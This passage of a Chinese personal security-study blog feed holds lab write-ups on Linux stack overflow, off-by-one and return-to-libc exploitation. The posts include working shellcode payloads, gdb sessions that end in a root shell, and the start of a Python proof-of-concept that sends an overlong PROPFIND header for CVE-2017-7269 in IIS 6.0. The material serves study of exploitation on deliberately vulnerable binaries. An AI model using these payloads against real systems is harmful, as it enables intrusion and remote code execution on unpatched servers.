class="line">[...]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个bug是一个经典的释放重引用漏洞，但遗憾的是没有zval，而只是一个HashTable被释放。然而，这仍然是早期php4版本中存在的可以利用的bug。但是，这个bug很难被利用，因为我无法通过它来泄露任意内存。因此，难以伪造可用于进一步开发目的的必要的hashtable。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[linux下return-to-libc]]></title>
      <url>http://yoursite.com/2017/04/11/linux%E4%B8%8Breturn-to-libc/</url>
      <content type="html"><![CDATA[<p>漏洞源代码就是我上一章的代码<br>编译命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -g -fno-stack-protector -o vuln vuln.c</div></pre></td></tr></table></figure></p>
<p>注意：“-z execstack”参数不传递给gcc，这时候堆栈是不可执行的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">There are 9 program headers, starting at offset 52</div><div class="line"></div><div class="line">Program Headers:</div><div class="line">  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</div><div class="line">  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4</div><div class="line">  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1</div><div class="line">      [Requesting program interpreter: /lib/ld-linux.so.2]</div><div class="line">  LOAD           0x000000 0x08048000 0x08048000 0x00634 0x00634 R E 0x1000</div><div class="line">  LOAD           0x000f14 0x08049f14 0x08049f14 0x00104 0x0010c RW  0x1000</div><div class="line">  DYNAMIC        0x000f28 0x08049f28 0x08049f28 0x000c8 0x000c8 RW  0x4</div><div class="line">  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4</div><div class="line">  GNU_EH_FRAME   0x00053c 0x0804853c 0x0804853c 0x00034 0x00034 R   0x4</div><div class="line">  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4</div><div class="line">  GNU_RELRO      0x000f14 0x08049f14 0x08049f14 0x000ec 0x000ec R   0x1</div></pre></td></tr></table></figure></p>
<p>  构造shellcode前，要先明白，堆栈布局，我就不画图了，268填充物+system地址+exit地址+／bin/sh地址。就照这样排版，就可以返回shell。exit那个地方可以好想可以用填充物替代。</p>
<p>  最终可以获得shell<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">  (gdb) r `python -c &apos;print &quot;A&quot;*268 + &quot;\xb0\xe0\xe5\xb7&quot;+&quot;B&quot;*4+&quot;\xa0\x26\xf8\xb7&quot;&apos;`</div><div class="line">Starting program: /home/hackyzh/vuln `python -c &apos;print &quot;A&quot;*268 + &quot;\xb0\xe0\xe5\xb7&quot;+&quot;B&quot;*4+&quot;\xa0\x26\xf8\xb7&quot;&apos;`</div><div class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???BBBB?&amp;??</div><div class="line"># exit</div></pre></td></tr></table></figure></p>
<p>获得system等内存地址的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;dlfcn.h&gt;</div><div class="line">#include &lt;signal.h&gt;</div><div class="line"></div><div class="line">#include &lt;setjmp.h&gt;</div><div class="line"></div><div class="line">int step;</div><div class="line">jmp_buf env;</div><div class="line"></div><div class="line">void fault()&#123;</div><div class="line"></div><div class="line">if(step&lt;0)&#123;</div><div class="line">   longjmp(env,1);</div><div class="line">&#125;else&#123;</div><div class="line">  printf(&quot;Can&apos;t find /bin/sh in libc,use env insted...\n&quot;);</div><div class="line"> exit(0);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc,char **argv)&#123;</div><div class="line">     void *handle;</div><div class="line">     int *sysaddr,*exitaddr;</div><div class="line">     long shell;</div><div class="line">     char examp[512];</div><div class="line">     char *args[3];</div><div class="line">     char *envs[1];</div><div class="line">     long *lp;</div><div class="line">  </div><div class="line">    handle=dlopen(NULL,RTLD_LOCAL);</div><div class="line">    *(void **)(&amp;sysaddr)=dlsym(handle,&quot;system&quot;);</div><div class="line">    sysaddr+=4096;  //base address/4</div><div class="line">    printf(&quot;system() found at %08x\n&quot;,sysaddr);</div><div class="line">    *(void **)(&amp;exitaddr)=dlsym(handle,&quot;exit&quot;);</div><div class="line">    exitaddr+=4096; //base address/4</div><div class="line">    printf(&quot;exit() found at %08x\n&quot;,exitaddr);</div><div class="line"></div><div class="line"></div><div class="line">    if(setjmp(env))</div><div class="line">       step=1;</div><div class="line">    else</div><div class="line">       step=-1;</div><div class="line">    shell=(int)sysaddr;</div><div class="line">    signal(SIGSEGV,fault);</div><div class="line">    do</div><div class="line">      while(memcmp((void *)shell,&quot;/bin/sh&quot;,8)) shell+=step;</div><div class="line">    while(!(shell&amp;0xff)||!(shell,0xff00)||!(shell &amp; 0xff0000)|| !(shell,0xff000000));</div><div class="line">    printf(&quot;\&quot;/bin/sh\&quot; found at %08x\n&quot;,shell+16384);  //base address</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>可以对比gdb调试得出的system等地址做比较，这里有个问题,不知道这个代码的base address是怎么得出来的。<br>参考文章：<br>翻译文章系列 linux x86<br>灰帽黑客第四版</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[linux下off by one利用]]></title>
      <url>http://yoursite.com/2017/04/11/linux%E4%B8%8Boff-by-one%E5%88%A9%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>漏洞代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">void foo(char* arg);</div><div class="line">void bar(char* arg);</div><div class="line">void foo(char* arg) &#123;</div><div class="line"> bar(arg); /* [1] */</div><div class="line">&#125;</div><div class="line">void bar(char* arg) &#123;</div><div class="line"> char buf[256];</div><div class="line"> strcpy(buf, arg); /* [2] */</div><div class="line">&#125;</div><div class="line">int main(int argc, char *argv[]) &#123;</div><div class="line"> if(strlen(argv[1])&gt;256) &#123; /* [3] */</div><div class="line">  printf(&quot;Attempted Buffer Overflow\n&quot;);</div><div class="line">  fflush(stdout);</div><div class="line">  return -1;</div><div class="line"> &#125;</div><div class="line"> foo(argv[1]); /* [4] */</div><div class="line"> return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>关键利用点就是leave指令和ret指令，写完shellcode后，后面重复覆盖的返回地址。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div></pre></td><td class="code"><pre><div class="line">(gdb) r</div><div class="line">The program being debugged has been started already.</div><div class="line">Start it from the beginning? (y or n) y</div><div class="line">Starting program: /root/vuln `python -c &apos;print &quot;\x90&quot;*147+&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;+&quot;\x2c\xf5\xff\xbf&quot;*21&apos;`</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048496 in bar ()</div><div class="line">(gdb) disas bar</div><div class="line">Dump of assembler code for function bar:</div><div class="line">   0x08048477 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x08048478 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x0804847a &lt;+3&gt;:	sub    $0x108,%esp</div><div class="line">   0x08048480 &lt;+9&gt;:	mov    0x8(%ebp),%eax</div><div class="line">   0x08048483 &lt;+12&gt;:	mov    %eax,0x4(%esp)</div><div class="line">   0x08048487 &lt;+16&gt;:	lea    -0x100(%ebp),%eax</div><div class="line">   0x0804848d &lt;+22&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08048490 &lt;+25&gt;:	call   0x8048370 &lt;strcpy@plt&gt;</div><div class="line">   0x08048495 &lt;+30&gt;:	leave  </div><div class="line">=&gt; 0x08048496 &lt;+31&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line">(gdb) i reg</div><div class="line">eax            0xbffff508	-1073744632</div><div class="line">ecx            0xbffff8f0	-1073743632</div><div class="line">edx            0xbffff605	-1073744379</div><div class="line">ebx            0xb7fc6ff4	-1208193036</div><div class="line">esp            0xbffff60c	0xbffff60c</div><div class="line">ebp            0xbffff600	0xbffff600</div><div class="line">esi            0x0	0</div><div class="line">edi            0xbffff8f4	-1073743628</div><div class="line">eip            0x8048496	0x8048496 &lt;bar+31&gt;</div><div class="line">eflags         0x200202	[ IF ID ]</div><div class="line">cs             0x73	115</div><div class="line">ss             0x7b	123</div><div class="line">ds             0x7b	123</div><div class="line">es             0x7b	123</div><div class="line">fs             0x0	0</div><div class="line">gs             0x33	51</div><div class="line">(gdb) x/x $esp</div><div class="line">0xbffff60c:	0x08048475</div><div class="line">(gdb) x/x $ebp</div><div class="line">0xbffff600:	0xbffff52c</div><div class="line">(gdb) n</div><div class="line">Single stepping until exit from function bar,</div><div class="line">which has no line number information.</div><div class="line">0x08048475 in foo ()</div><div class="line">(gdb) i reg</div><div class="line">eax            0xbffff508	-1073744632</div><div class="line">ecx            0xbffff8f0	-1073743632</div><div class="line">edx            0xbffff605	-1073744379</div><div class="line">ebx            0xb7fc6ff4	-1208193036</div><div class="line">esp            0xbffff610	0xbffff610</div><div class="line">ebp            0xbffff600	0xbffff600</div><div class="line">esi            0x0	0</div><div class="line">edi            0xbffff8f4	-1073743628</div><div class="line">eip            0x8048475	0x8048475 &lt;foo+17&gt;</div><div class="line">eflags         0x200202	[ IF ID ]</div><div class="line">cs             0x73	115</div><div class="line">ss             0x7b	123</div><div class="line">ds             0x7b	123</div><div class="line">es             0x7b	123</div><div class="line">fs             0x0	0</div><div class="line">gs             0x33	51</div><div class="line">(gdb) x/x $esp</div><div class="line">0xbffff610:	0xbffff7f3</div><div class="line">(gdb) x/x $ebp</div><div class="line">0xbffff600:	0xbffff52c</div><div class="line">(gdb) disas bar</div><div class="line">Dump of assembler code for function bar:</div><div class="line">   0x08048477 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x08048478 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x0804847a &lt;+3&gt;:	sub    $0x108,%esp</div><div class="line">   0x08048480 &lt;+9&gt;:	mov    0x8(%ebp),%eax</div><div class="line">   0x08048483 &lt;+12&gt;:	mov    %eax,0x4(%esp)</div><div class="line">   0x08048487 &lt;+16&gt;:	lea    -0x100(%ebp),%eax</div><div class="line">   0x0804848d &lt;+22&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08048490 &lt;+25&gt;:	call   0x8048370 &lt;strcpy@plt&gt;</div><div class="line">   0x08048495 &lt;+30&gt;:	leave  </div><div class="line">   0x08048496 &lt;+31&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line"></div><div class="line">(gdb) disas foo</div><div class="line">Dump of assembler code for function foo:</div><div class="line">   0x08048464 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x08048465 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x08048467 &lt;+3&gt;:	sub    $0x4,%esp</div><div class="line">   0x0804846a &lt;+6&gt;:	mov    0x8(%ebp),%eax</div><div class="line">   0x0804846d &lt;+9&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08048470 &lt;+12&gt;:	call   0x8048477 &lt;bar&gt;</div><div class="line">=&gt; 0x08048475 &lt;+17&gt;:	leave  </div><div class="line">   0x08048476 &lt;+18&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line">(gdb) n</div><div class="line">Single stepping until exit from function foo,</div><div class="line">which has no line number information.</div><div class="line">0xbffff52c in ?? ()</div><div class="line">(gdb) disas foo</div><div class="line">Dump of assembler code for function foo:</div><div class="line">   0x08048464 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x08048465 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x08048467 &lt;+3&gt;:	sub    $0x4,%esp</div><div class="line">   0x0804846a &lt;+6&gt;:	mov    0x8(%ebp),%eax</div><div class="line">   0x0804846d &lt;+9&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08048470 &lt;+12&gt;:	call   0x8048477 &lt;bar&gt;</div><div class="line">   0x08048475 &lt;+17&gt;:	leave  </div><div class="line">   0x08048476 &lt;+18&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line">(gdb) i reg</div><div class="line">eax            0xbffff508	-1073744632</div><div class="line">ecx            0xbffff8f0	-1073743632</div><div class="line">edx            0xbffff605	-1073744379</div><div class="line">ebx            0xb7fc6ff4	-1208193036</div><div class="line">esp            0xbffff608	0xbffff608</div><div class="line">ebp            0xbffff52c	0xbffff52c</div><div class="line">esi            0x0	0</div><div class="line">edi            0xbffff8f4	-1073743628</div><div class="line">eip            0xbffff52c	0xbffff52c</div><div class="line">eflags         0x200202	[ IF ID ]</div><div class="line">cs             0x73	115</div><div class="line">ss             0x7b	123</div><div class="line">ds             0x7b	123</div><div class="line">es             0x7b	123</div><div class="line">fs             0x0	0</div><div class="line">gs             0x33	51</div><div class="line">(gdb) x/x $esp</div><div class="line">0xbffff608:	0xbffff600</div><div class="line">(gdb) x/x 0xbffff600</div><div class="line">0xbffff600:	0xbffff52c</div><div class="line">(gdb) x/x 0xbffff52c</div><div class="line">0xbffff52c:	0x90909090</div></pre></td></tr></table></figure>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[linux下栈溢出学习笔记]]></title>
      <url>http://yoursite.com/2017/04/09/linux%E4%B8%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>代码是直接拷贝我翻译的文章来的，发现linux下的利用没有windows的直白简单。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">int main(int argc, char* argv[]) &#123;</div><div class="line">        /* [1] */ char buf[256];</div><div class="line">        /* [2] */ strcpy(buf,argv[1]);</div><div class="line">        /* [3] */ printf(&quot;Input:%s\n&quot;,buf);</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>编译过后，不多说直接发送字符串覆盖返回地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">(gdb) r `python -c &apos;print &quot;A&quot;*268 + &quot;B&quot;*4&apos;`</div><div class="line">The program being debugged has been started already.</div><div class="line">Start it from the beginning? (y or n) y</div><div class="line"></div><div class="line">Starting program: /home/hackyzh/vuln `python -c &apos;print &quot;A&quot;*268 + &quot;B&quot;*4&apos;`</div><div class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">0x42424242 in ?? ()</div></pre></td></tr></table></figure></p>
<p>看到返回地址覆盖被覆盖，现在可以构造exp布局了。<br>我一直以为下面的代码就可以获得esp地址利用了，原来是我想错了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">unsigned int get_sp(void)&#123;</div><div class="line"></div><div class="line"></div><div class="line">   __asm__(&quot;movl %esp,%eax&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main()&#123;</div><div class="line"> printf(&quot;stack pointer(esp):0x%x\n&quot;,get_sp());</div><div class="line"></div><div class="line">return 0;</div><div class="line"></div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>运行代码后会获得一个地址，事先要关闭aslr.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@ubuntu:/home/hackyzh# ./get_esp </div><div class="line">stack pointer(esp):0xbffff728</div></pre></td></tr></table></figure></p>
<p>运行代码发现失败了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">(gdb) r `python -c &apos;print &quot;A&quot;*268 + &quot;\x28\xf7\xff\xbf&quot;+&quot;\x90&quot;*20+&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;&apos;`</div><div class="line">The program being debugged has been started already.</div><div class="line">Start it from the beginning? (y or n) y</div><div class="line"></div><div class="line">Starting program: /home/hackyzh/vuln `python -c &apos;print &quot;A&quot;*268 + &quot;\x28\xf7\xff\xbf&quot;+&quot;\x90&quot;*20+&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;&apos;`</div><div class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(???????????????????????1?Ph//shh/bin??PS??1Ұ</div><div class="line">                                                                               ̀</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">0xbffff728 in ?? ()</div></pre></td></tr></table></figure></p>
<p>查看esp地址处的情况。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(gdb) x/20x $esp-10</div><div class="line">0xbffff5c6:	0x41	0x41	0x41	0x41	0x41	0x41	0x28	0xf7</div><div class="line">0xbffff5ce:	0xff	0xbf	0x90	0x90	0x90	0x90	0x90	0x90</div><div class="line">0xbffff5d6:	0x90	0x90	0x90	0x90</div></pre></td></tr></table></figure></p>
<p>卧槽这跟我想的情况完全不一样，0xbffff728和0xbffff5d0差距不是一般的远，这就尴尬了，只好改一下一地址，也算为自己提醒一下。不明白哪里有问题了。</p>
<p>最终利用成功,虽然我本身用的是root用户，不过跟返回的root shell不冲突。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">(gdb) r `python -c &apos;print &quot;A&quot;*268 + &quot;\xd0\xf5\xff\xbf&quot;+&quot;\x90&quot;*20+&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;&apos;`</div><div class="line">The program being debugged has been started already.</div><div class="line">Start it from the beginning? (y or n) y</div><div class="line"></div><div class="line">Starting program: /home/hackyzh/vuln `python -c &apos;print &quot;A&quot;*268 + &quot;\xd0\xf5\xff\xbf&quot;+&quot;\x90&quot;*20+&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;&apos;`</div><div class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA????????????????????????1?Ph//shh/bin??PS??1Ұ</div><div class="line">                                                                               ̀</div><div class="line">process 11131 is executing new program: /bin/dash</div><div class="line"># whoami</div><div class="line">root</div></pre></td></tr></table></figure></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[(翻译)Linux (x86) Exploit 开发系列教程]]></title>
      <url>http://yoursite.com/2017/04/06/Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B/</url>
      <content type="html"><![CDATA[<p>发表在看雪上，所以直接贴链接了，感觉这个系列教程对于我们这种linux菜鸟很有帮助，后续会不断翻译。</p>
<p>典型的基于堆栈的溢出：<a href="http://bbs.pediy.com/thread-216868.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-216868.htm</a><br>整数溢出：<a href="http://bbs.pediy.com/thread-216869.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-216869.htm</a><br>Off-By-One 漏洞 (基于栈): <a href="http://bbs.pediy.com/thread-216954.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-216954.htm</a><br>使用return-to-libc绕过NX bit: <a href="http://bbs.pediy.com/thread-216956.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-216956.htm</a><br>使用链接的return-to-libc绕过NX：<a href="http://bbs.pediy.com/thread-217007.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-217007.htm</a><br>绕过aslr：<a href="http://bbs.pediy.com/thread-217107.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-217107.htm</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CVE-2017-7269个人学习分析]]></title>
      <url>http://yoursite.com/2017/03/30/CVE-2017-7269%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01    环境"></a>0x01    环境</h2><p>Windwos server 2003</p>
<p>IIS6.0  WEBDAV开启</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>根据网上得知是ScStoragePathFromUrl函数造成的缓冲区溢出。通过一个以“If: &lt;<a href="http://”开始的较长header头的PROPFIND请求执行任意代码。这里就简单的分析一下，首先构造一个简易的poc代码。" target="_blank" rel="external">http://”开始的较长header头的PROPFIND请求执行任意代码。这里就简单的分析一下，首先构造一个简易的poc代码。</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">import socket  </div><div class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </div><div class="line">sock.connect((&apos;10.121.21.55&apos;,80))  </div><div class="line">pay=&apos;PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n&apos;</div><div class="line">pay+=&apos;If: &lt;http://localhost/aaaaaaa&apos;</div><div class="line">pay+=&apos;\x41&apos;*9000</div><div class="line">pay+=&apos;&gt;&apos;</div><div class="line">pay+=&apos;&gt;\r\n\r\n&apos;</div><div class="line">print pay</div><div class="line">sock.send(pay)  </div><div class="line">data = sock.recv(80960)  </div><div class="line">print data </div><div class="line">sock.close</div></pre></td></tr></table></figure>
